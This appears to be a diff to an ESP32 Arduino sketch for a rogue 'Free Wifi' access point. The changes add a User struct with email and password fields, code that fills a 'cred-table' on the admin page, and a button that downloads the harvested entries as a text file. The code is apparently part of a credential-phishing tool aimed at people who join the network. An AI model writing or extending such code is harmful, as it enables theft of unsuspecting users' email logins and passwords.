@@ -6,9 +6,18 @@
 #include <WebSocketsServer.h>
 #include <esp_wifi.h>
 
+#include <LinkedList.h>
 #include "ArduinoJson.h"
 
 #include "global.h"
+
+// Define Struct for User
+typedef struct User {
+  // const char *email;
+  // const char *pass;
+  String email;
+  String pass;
+} User;
 
 // WI-FI SETTINGS
 const char *defaultSSID = "Free Wifi";
@@ -207,17 +216,20 @@ const char ADMIN_PAGE[] PROGMEM = R"=====(
         <tr>
         </tr>
       </table>
+      <br>
+      <button type="button" class="btn" id="downloadButton" onclick="downloadTable()">Download Table</button>
+      <br>
     </div>
     <br>
     <div class="category">Controls</div>
     <br>
     <div class="bodytext">Change SSID </div>
     	<input type="text" class="textbox" id="ssidTextbox" name="ssid" value="" minlength="1" maxlength="32" size="20">
-    	<button type="button" class = "btn" id = "btn1" onclick="ButtonPress0()">Restart</button>
+    	<button type="button" class = "btn" id = "btn1" onclick="changeSSID()">Restart</button>
     </div>
     <br>
     <br>
-    <button type="button" class = "btn" id = "btn0" onclick="ButtonPress1()">Shutdown</button>
+    <button type="button" class = "btn" id = "btn0" onclick="shutdown()">Shutdown</button>
     <br>
   </main>
   </body>
@@ -252,7 +264,11 @@ const char ADMIN_PAGE[] PROGMEM = R"=====(
 
         // Log connection state
         console.log("Connected");
-
+        
+        const message = {
+          action: "populateTable"
+        };
+        sendWSMessage(JSON.stringify(message));
     }
 
     // Called when the WebSocket connection is closed
@@ -292,7 +308,35 @@ const char ADMIN_PAGE[] PROGMEM = R"=====(
         websocket.send(message);
     }
 
-    function ButtonPress0() {    
+	function downloadTable() {
+      const table = document.getElementById("cred-table"); // Get the cred table element
+      const rows = table.querySelectorAll("tr"); // Get all the rows in the table
+      
+      let content = "";
+      
+      rows.forEach(row => {
+        const cells = row.querySelectorAll("td"); // Get all the cells in the row
+        cells.forEach(cell => {
+            content += cell.textContent + " "; // Concatenate the text content of each cell
+        });
+        if (cells.length > 0) {
+        	content += "\n";
+        }
+	  });
+      
+      // Convert the content to a Blob
+      const blob = new Blob([content], { type: 'text/plain' });
+      // Create a URL for the Blob
+      const url = URL.createObjectURL(blob);
+      // Create a link element and trigger a click event to download the Blob
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "table.txt";
+      a.click();
+      URL.revokeObjectURL(url); // Clean up the URL
+    }
+
+    function changeSSID() {
       var ssid = document.getElementById("ssidTextbox").value;
       if (ssid != "") {
         const message = {
@@ -304,7 +348,7 @@ const char ADMIN_PAGE[] PROGMEM = R"=====(
       }
     }
 
-    function ButtonPress1() {
+    function shutdown() {
       const message = {
         action: "shutdown"
       };
